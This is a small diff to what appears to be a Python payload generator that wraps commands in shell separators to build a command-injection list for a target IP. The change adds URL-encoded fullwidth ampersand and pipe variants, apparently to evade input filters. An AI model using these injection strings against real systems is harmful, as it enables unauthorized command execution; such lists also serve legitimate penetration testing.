@@ -50,7 +50,7 @@ if len(sys.argv) < 3:
 
 ip_address = sys.argv[1]
 file_in = sys.argv[2]
-prefissi = ["%00 ", "%00; ", "%0A ", "|| ", "| ", "; ", "& ", "&& "]
+prefissi = ["%00 ", "%00; ", "%0A ", "|| ", "| ", "; ", "& ", "&& ", "%EF%BC%86 ", "%EF%BC%86%EF%BC%86 ", "%EF%BD%9C ", "%EF%BD%9C%EF%BD%9C "]
 suffissi = ["%00 ", "%00; ", "%0A ", "? ", "?%00 ", "; ", "& ", "|| ", "| ", "-- ", "# "]
 with open(file_in, 'r') as f:
     with open('out-command-injection-list.txt', 'w') as out:
